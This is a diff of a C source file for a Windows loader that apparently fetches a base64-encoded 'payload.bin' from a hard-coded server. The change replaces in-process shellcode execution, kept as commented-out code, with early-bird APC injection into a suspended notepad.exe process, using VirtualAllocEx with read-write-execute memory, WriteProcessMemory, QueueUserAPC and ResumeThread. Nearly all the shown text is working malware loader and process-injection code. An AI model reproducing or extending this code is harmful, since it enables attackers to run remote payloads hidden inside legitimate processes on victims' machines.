@@ -34,7 +34,7 @@
 #define SERVER_IP "192.168.51.75"
 #define SERVER_PORT 8080
 #define ENDPOINT "/api"
-#define REMOTE_FILE "exec_whoami.bin"
+#define REMOTE_FILE "payload.bin"
 
 // Decode Base64 -> Raw Bytes
 
@@ -55,20 +55,36 @@ BOOL Base64Decode(const char* base64, BYTE** output, DWORD* outLen) {
 }
 
 // Execute
+// void ExecuteBytes(unsigned char *buffer, int buf_len)
+// {
+// 	// Allocate some memory
+//     void *mem = VirtualAlloc(0, buf_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+
+//     // Copy the bytes there
+//     memcpy(mem, buffer, buf_len);
+
+//     // Change the memory protections
+//     DWORD oldProtect;
+//     VirtualProtect(mem, buf_len, PAGE_EXECUTE_READ, &oldProtect);
+
+//     // Execute the memory segment
+//     ((void(*)())mem)();
+// }
 void ExecuteBytes(unsigned char *buffer, int buf_len)
 {
-	// Allocate some memory
-    void *mem = VirtualAlloc(0, buf_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
 
-    // Copy the bytes there
-    memcpy(mem, buffer, buf_len);
-
-    // Change the memory protections
-    DWORD oldProtect;
-    VirtualProtect(mem, buf_len, PAGE_EXECUTE_READ, &oldProtect);
-
-    // Execute the memory segment
-    ((void(*)())mem)();
+    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    HANDLE hProcess = pi.hProcess;
+    HANDLE hThread = pi.hThread;
+    
+    LPVOID memory = VirtualAllocEx(hProcess, NULL, buf_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)memory;
+    
+    WriteProcessMemory(hProcess, memory, buffer, buf_len, NULL);
+    QueueUserAPC((PAPCFUNC)apcRoutine, hThread, 0);    
+    ResumeThread(hThread);
 }
 
 // HTTPS Client
